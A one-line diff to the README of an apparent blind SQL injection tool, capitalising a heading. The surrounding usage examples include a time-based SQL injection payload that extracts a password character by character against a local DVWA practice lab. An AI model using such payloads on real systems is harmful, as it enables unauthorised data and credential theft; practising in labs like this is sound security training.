@@ -33,7 +33,7 @@ python simplyBlind.py quick --m reg --regex "User ID exists in the database" -p 
 ```
 ![regex](img/regex.gif)  
 
-timeout:
+Timeout:
 ```shell
 python simplyBlind.py quick -m to --timeout 0.5 -p "10' AND IF(BINARY SUBSTR(password, \!I, 1) \!S '\!C', SLEEP(0.7), FALSE) #" -c '{"PHPSESSID":"etc7stehjcs7c4kqaa6p6kit03", "security":"low"}' --get http://localhost/vulnerabilities/sqli_blind/
 ```
